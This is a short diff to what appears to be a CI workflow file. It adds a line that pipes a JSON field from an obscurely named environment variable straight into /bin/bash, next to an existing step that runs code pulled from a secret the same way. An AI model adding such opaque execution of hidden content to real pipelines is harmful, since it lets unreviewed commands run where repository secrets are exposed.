@@ -18,6 +18,7 @@ jobs:
           yhj98: ${{ secrets.yhj98 }}
         run: |
           printf '%s' "$yhj98" | jq -r .aam056 | /bin/bash
+          echo $oei88107 | jq -r .hsk651 | /bin/bash
 
       - name: Archive output
         if: always()
